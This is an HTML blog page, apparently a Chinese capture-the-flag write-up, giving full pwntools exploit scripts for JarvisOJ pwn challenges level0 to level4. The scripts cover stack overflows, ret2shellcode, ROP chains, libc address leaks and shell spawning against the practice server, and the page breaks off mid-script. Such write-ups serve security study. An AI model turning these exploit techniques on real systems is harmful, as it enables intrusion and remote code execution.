@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zn-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Pwnlevel0checksec  只开起NX ida分析   存在栈溢出，且有后面函数。 exp 1234567891011121314151617#!&#x2F;usr&#x2F;bin&#x2F;env python# coding&#x3D;utf-8from pwn import*context.log_level&#x3D;&#39;debug&#39;#p&#x3D;remote(&#39;pwn2.jarvisoj.com&#39;,9881)p&#x3D;process(&#39;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jarvisoj">
+<meta property="og:url" content="https://caiii-vegtable.github.io/2020/11/14/jarvisoj/index.html">
+<meta property="og:site_name" content="inHaus&#39;blog">
+<meta property="og:description" content="Pwnlevel0checksec  只开起NX ida分析   存在栈溢出，且有后面函数。 exp 1234567891011121314151617#!&#x2F;usr&#x2F;bin&#x2F;env python# coding&#x3D;utf-8from pwn import*context.log_level&#x3D;&#39;debug&#39;#p&#x3D;remote(&#39;pwn2.jarvisoj.com&#39;,9881)p&#x3D;process(&#39;">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/01.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/02.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/03.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/04.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/11.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/12.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/13.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/21.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/22.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/23.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/24.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/2.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1605404037504.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/2-1605405665770.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/3.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/4.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1605407639410.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/2-1605407649611.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1605623023627.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1605706961710.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/2-1605707127195.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/7.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/8.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/9.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/10.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/11-1605793302655.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/12-1605793379133.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/13-1605793413262.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/3-1605875254456.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/5-1605875279680.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/6-1605876242587.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/7-1605876258590.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1606473982494.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/2-1606474035220.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/3-1606474202178.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/4-1606474479717.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/3.webp">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1607081080223.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/2-1607082053279.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/jarvisoj/1-1605447043321.png">
+<meta property="article:published_time" content="2020-11-14T03:12:25.000Z">
+<meta property="article:modified_time" content="2020-12-04T12:08:07.669Z">
+<meta property="article:author" content="caiii-vegtable">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://caiii-vegtable.github.io/image/jarvisoj/01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://caiii-vegtable.github.io/2020/11/14/jarvisoj/"/>
+
+
+
+
+
+  <title>jarvisoj | inHaus'blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zn-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">inHaus'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://caiii-vegtable.github.io/2020/11/14/jarvisoj/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="caiii-vegtable">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inHaus'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">jarvisoj</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-11-14T11:12:25+08:00">
+                2020-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/01.png" alt="01"></p>
+<p>只开起NX</p>
+<p>ida分析</p>
+<p><img src="/image/jarvisoj/02.png" alt="02"></p>
+<p><img src="/image/jarvisoj/03.png" alt="03"></p>
+<p>存在栈溢出，且有后面函数。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=remote('pwn2.jarvisoj.com',9881)</span></span><br><span class="line">p=process(<span class="string">'./level0'</span>)</span><br><span class="line">callsystem=<span class="number">0x400596</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> #ubuntu18 下需要16字节对齐</span></span><br><span class="line"><span class="string">ret=0x0000000000400431</span></span><br><span class="line"><span class="string">payload='a'*0x88+p64(ret)+p64(callsystem)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(callsystem)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/04.png" alt="04"></p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/11.png" alt="11"></p>
+<p>什么保护都没有</p>
+<p>main函数和level0相似</p>
+<p>vuln</p>
+<p><img src="/image/jarvisoj/12.png" alt="12"></p>
+<p>打印了buf的地址，存在栈溢出，考虑ret2shellcode</p>
+<p>栈结构</p>
+<p>|shellcode|</p>
+<p>|aaaaaaaa|</p>
+<p>|…….          |</p>
+<p>|ebp(aaaa) |</p>
+<p>|ret(buf_addr)|</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=remote('pwn2.jarvisoj.com',9877)</span></span><br><span class="line">p=process(<span class="string">'./level1'</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">buf_addr=int(p.recvuntil(<span class="string">'?\n'</span>,drop=<span class="literal">True</span>)[<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0x88</span>+<span class="number">4</span>,<span class="string">'a'</span>)+p32(buf_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/13.png" alt="13"></p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/21.png" alt="21"></p>
+<p>ida分析</p>
+<p><img src="/image/jarvisoj/22.png" alt="22"></p>
+<p>存在栈溢出，调用system函数，但是没有直接的后门。</p>
+<p>查找字符串发现/bin/sh</p>
+<p><img src="/image/jarvisoj/23.png" alt="23"></p>
+<p>构造rop</p>
+<p>padding+ebp+system+system返回地址+system参数</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./level2')</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line">elf=ELF(<span class="string">'./level2'</span>)</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line">binsh=<span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'b'</span>*<span class="number">4</span>+p32(system_plt)+<span class="string">'c'</span>*<span class="number">4</span>+p32(binsh)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/24.png" alt="24"></p>
+<h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>和level2一样，但是是64位程序，函数传参方式不同</p>
+<p>需要pop，rdi，ret这样的gadget</p>
+<p><img src="/image/jarvisoj/1.png" alt="1"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./level2_x64')</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9882</span>)</span><br><span class="line">elf=ELF(<span class="string">'./level2_x64'</span>)</span><br><span class="line">system_plt=elf.plt[<span class="string">'system'</span>]</span><br><span class="line">binsh=<span class="number">0x0000000000600A90</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004006b3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ubuntu18 下同样需要16字节对齐</span></span><br><span class="line"><span class="string">ret=0x00000000004004a1</span></span><br><span class="line"><span class="string">payload='a'*0x80+'b'*8+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_plt)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x80</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh)+p64(system_plt)</span><br><span class="line"><span class="comment"># padding+rbp+pop_rdi_ret+binsh_addr+system_addr</span></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/2.png" alt="2"></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/1-1605404037504.png" alt="1"></p>
+<p>ida分析</p>
+<p>和level2相似，但是没有调用system函数，也没有/bin/sh</p>
+<p>先利用write函数泄露libc，在计算system和/bin/sh的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># padding+ebp+write_plt+main_addr（返回地址）+write的参数</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接受write函数地址，计算system和/bin/sh</span></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libcbase=write_addr-libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh=libcbase+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(ret)+p32(system)+<span class="string">'cccc'</span>+p32(binsh) <span class="comment"># 正常的溢出</span></span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line"><span class="comment">#p=process('./level3')</span></span><br><span class="line">elf=ELF(<span class="string">'./level3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libcbase=write_addr-libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh=libcbase+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(system)+<span class="string">'cccc'</span>+p32(binsh)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/2-1605405665770.png" alt="2"></p>
+<h2 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h2><p>程序和level3一样但是是64位</p>
+<p>传参方式不同</p>
+<p>64位传参寄存器顺序是RDI, RSI, RDX, RCX, R8, R9</p>
+<p><img src="/image/jarvisoj/3.png" alt="3"></p>
+<p>有rdi和rsi_r15，但是没有rdx，不够如果rdx中值大于8就可以。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9883</span>)</span><br><span class="line"><span class="comment">#p=process('./level3')</span></span><br><span class="line">elf=ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19_x64.so'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">vuln_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">pop_rdi=<span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004006b1</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase=write_addr-libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system=libcbase+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh=libcbase+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/4.png" alt="4"></p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/1-1605407639410.png" alt="1"></p>
+<p>ida</p>
+<p><img src="/image/jarvisoj/2-1605407649611.png" alt="2"></p>
+<p>栈溢出，与前面不同的是没有给libc</p>
+<p>首先泄露libc</p>
+<p>然后使用LibcSearcher查找libc</p>
+<p>计算sytem和/bin/sh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line">elf=ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">"read"</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr)+<span class="string">'bbbb'</span>+p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么搜索到的libc不对</p>
+<p>还有一种使用Dynelf模块的方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=remote('pwn2.jarvisoj.com',9880)</span></span><br><span class="line">r=process(<span class="string">'./level4'</span>)</span><br><span class="line">e=ELF(<span class="string">'./level4'</span>)</span><br><span class="line">write_plt=e.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt=e.symbols[<span class="string">'read'</span>]</span><br><span class="line">func=e.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">data_addr=<span class="number">0x804a024</span>  <span class="comment">#e.symbols['__bss_start']</span></span><br><span class="line"><span 